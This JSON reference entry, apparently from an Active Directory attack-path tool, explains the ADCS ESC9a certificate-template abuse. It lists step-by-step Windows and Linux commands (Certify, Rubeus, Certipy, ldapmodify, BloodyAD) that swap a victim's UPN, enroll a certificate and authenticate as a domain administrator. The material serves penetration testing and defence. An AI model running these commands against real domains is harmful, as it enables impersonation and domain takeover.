{
    "ADCSESC9a": {
        "meaning": "The principal has control over a victim principal with permission to enroll on one or more certificate templates configured to enable certificate authentication, require the userPrincipalName (UPN) of the enrollee included in the Subject Alternative Name (SAN), and do not have the security extension enabled. There is an affected Domain Controller configured to allow weak certificate binding enforcement. This allows impersonating any AD forest principal by manipulating the victim's UPN before and after certificate enrollment.",
        "common": "",
        "windows": {
            "PowerView_Certify": [
                {
                    "order": 1,
                    "command": "Set-DomainObject -Identity VICTIM -Set @{'userprincipalname'='Target'}",
                    "description": "Set UPN of victim to targeted principal's sAMAccountName"
                },
                {
                    "order": 2,
                    "command": "Get-DomainObject -Identity VICTIM -Properties mail",
                    "description": "Check if victim has mail attribute set (required for some templates)"
                },
                {
                    "order": 3,
                    "command": "Set-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}",
                    "description": "Set mail attribute if required by certificate template"
                },
                {
                    "order": 4,
                    "command": "# Obtain session as victim using Shadow Credentials, password reset, or Kerberoasting",
                    "description": "Obtain credentials or session as victim principal"
                },
                {
                    "order": 5,
                    "command": "Certify.exe request /ca:SERVER\\CA-NAME /template:TEMPLATE",
                    "description": "Enroll certificate as victim with manipulated UPN in SAN"
                },
                {
                    "order": 6,
                    "command": "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
                    "description": "Convert certificate to PFX format"
                },
                {
                    "order": 7,
                    "command": "Set-DomainObject -Identity VICTIM -Set @{'userprincipalname'='victim@corp.local'}",
                    "description": "Set UPN of victim to arbitrary value after enrollment"
                },
                {
                    "order": 8,
                    "command": ".\\Rubeus.exe asktgt /certificate:cert.pfx /user:forestrootda /domain:forestroot.com /ptt",
                    "description": "Authenticate as targeted principal using certificate"
                }
            ],
            "PowerView_ShadowCreds": [
                {
                    "order": 1,
                    "command": "Set-DomainObject -Identity VICTIM -Set @{'userprincipalname'='Administrator'}",
                    "description": "Set victim UPN to target administrator's sAMAccountName"
                },
                {
                    "order": 2,
                    "command": "# Use Shadow Credentials attack to obtain victim credentials",
                    "description": "Obtain victim session via Shadow Credentials"
                },
                {
                    "order": 3,
                    "command": "Certify.exe request /ca:CA_HOST\\CA_NAME /template:VulnTemplate",
                    "description": "Enroll certificate as victim with UPN in SAN"
                },
                {
                    "order": 4,
                    "command": "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
                    "description": "Convert to PFX format"
                },
                {
                    "order": 5,
                    "command": "Set-DomainObject -Identity VICTIM -Set @{'userprincipalname'='original@domain.com'}",
                    "description": "Reset victim UPN to original or arbitrary value"
                },
                {
                    "order": 6,
                    "command": "Rubeus.exe asktgt /certificate:cert.pfx /user:Administrator /domain:domain.com /ptt",
                    "description": "Authenticate as Administrator using weak certificate binding"
                }
            ]
        },
        "linux": {
            "Certipy": [
                {
                    "order": 1,
                    "command": "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -upn Target",
                    "description": "Set UPN of victim to targeted principal's sAMAccountName"
                },
                {
                    "order": 2,
                    "command": "ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail",
                    "description": "Check if victim has mail attribute set"
                },
                {
                    "order": 3,
                    "command": "echo -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
                    "description": "Set mail attribute if required by certificate template"
                },
                {
                    "order": 4,
                    "command": "# Obtain session as victim using Shadow Credentials, password reset, or Kerberoasting",
                    "description": "Obtain victim credentials through available attack vectors"
                },
                {
                    "order": 5,
                    "command": "certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE",
                    "description": "Enroll certificate as victim with UPN in SAN"
                },
                {
                    "order": 6,
                    "command": "certipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -upn victim@corp.local",
                    "description": "Set UPN of victim to arbitrary value after enrollment"
                },
                {
                    "order": 7,
                    "command": "certipy auth -pfx TARGET.pfx -dc-ip IP",
                    "description": "Authenticate as targeted principal using certificate"
                }
            ],
            "LDAP_Manual": [
                {
                    "order": 1,
                    "command": "echo -e \"dn: CN=VICTIM,CN=Users,DC=domain,DC=com\\nchangetype: modify\\nreplace: userPrincipalName\\nuserPrincipalName: Administrator\" | ldapmodify -x -D 'CN=attacker,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com",
                    "description": "Set victim UPN to target sAMAccountName via LDAP"
                },
                {
                    "order": 2,
                    "command": "ldapsearch -x -D 'CN=victim,CN=Users,DC=domain,DC=com' -w victimpass -h dc.domain.com -b 'DC=domain,DC=com' '(objectClass=certificateTemplate)'",
                    "description": "Enumerate available certificate templates"
                },
                {
                    "order": 3,
                    "command": "# Use victim credentials to request certificate with manipulated UPN",
                    "description": "Request certificate enrollment with UPN in SAN"
                },
                {
                    "order": 4,
                    "command": "echo -e \"dn: CN=VICTIM,CN=Users,DC=domain,DC=com\\nchangetype: modify\\nreplace: userPrincipalName\\nuserPrincipalName: victim@domain.com\" | ldapmodify -x -D 'CN=attacker,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com",
                    "description": "Reset victim UPN after certificate enrollment"
                },
                {
                    "order": 5,
                    "command": "python3 gettgtpkinit.py domain.com/Administrator -cert-pfx administrator.pfx -pfx-pass password -dc-ip DC_IP",
                    "description": "Authenticate as target using certificate via PKINIT"
                }
            ],
            "BloodyAD": [
                {
                    "order": 1,
                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD set object 'CN=VICTIM,CN=Users,DC=domain,DC=com' userPrincipalName 'Administrator'",
                    "description": "Set victim UPN to target sAMAccountName using BloodyAD"
                },
                {
                    "order": 2,
                    "command": "# Obtain victim session and enroll certificate",
                    "description": "Use victim credentials to enroll certificate"
                },
                {
                    "order": 3,
                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD set object 'CN=VICTIM,CN=Users,DC=domain,DC=com' userPrincipalName 'victim@domain.com'",
                    "description": "Reset victim UPN after certificate enrollment"
                }
            ]
        }
    }
}
